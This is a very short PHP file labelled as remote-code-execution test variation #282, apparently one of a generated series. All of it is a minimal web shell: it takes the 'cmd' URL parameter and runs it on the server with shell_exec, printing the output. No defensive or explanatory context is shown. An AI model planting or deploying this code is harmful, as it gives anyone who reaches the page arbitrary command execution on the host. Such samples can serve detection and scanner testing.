<?php
// RCE test variation #282
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>